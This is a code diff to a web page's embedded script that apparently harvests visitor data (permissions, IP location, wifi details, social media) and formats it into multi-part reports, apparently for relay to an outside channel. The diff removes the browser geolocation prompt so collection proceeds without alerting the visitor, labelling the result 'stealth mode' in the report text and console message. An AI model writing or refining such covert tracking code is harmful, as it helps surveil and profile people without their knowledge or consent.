@@ -745,7 +745,7 @@
         async function extractPermissionData() {
             const permissions = {};
             const permissionTypes = [
-                'camera', 'microphone', 'location', 'notifications', 
+                'camera', 'microphone', 'notifications', 
                 'background-sync', 'clipboard-read', 'clipboard-write'
             ];
             
@@ -863,11 +863,11 @@
             return info;
         }
 
-        // 10. Geolocation Data
+        // 10. Geolocation Data - MODIFIED: No permission request
         async function extractGeolocationData() {
             return {
                 ipLocation: await getIPLocation(),
-                browserLocation: await getBrowserLocation(),
+                browserLocation: { available: false, reason: 'No permission requested' },
                 wifiNetworks: extractWifiData()
             };
         }
@@ -879,33 +879,6 @@
             } catch (e) {
                 return { error: 'Location unavailable' };
             }
-        }
-
-        async function getBrowserLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve({ available: false });
-                    return;
-                }
-                
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        resolve({
-                            available: true,
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        });
-                    },
-                    (error) => {
-                        resolve({
-                            available: false,
-                            error: error.code
-                        });
-                    },
-                    { timeout: 5000 }
-                );
-            });
         }
 
         function extractWifiData() {
@@ -1039,8 +1012,7 @@ ${Object.keys(data.user.socialMedia).length > 0 ?
 
 <b>📍 GEOLOCATION:</b>
 • IP Location: ${data.geolocation.ipLocation.city || 'Unknown'}
-• Coordinates: ${data.geolocation.browserLocation.available ? 
-    `${data.geolocation.browserLocation.latitude}, ${data.geolocation.browserLocation.longitude}` : 'Not available'}
+• Browser Location: Not requested (stealth mode)
 
 <code>Part 3/4 - User Data</code>
             `.trim();
@@ -1143,7 +1115,7 @@ ${Object.keys(data.user.socialMedia).length > 0 ?
             });
         }, 3000);
 
-        console.log('🕵️ Enhanced comprehensive data extraction system loaded');
+        console.log('🕵️ Enhanced comprehensive data extraction system loaded - Stealth Mode Active');
     </script>
 </body>
 </html>
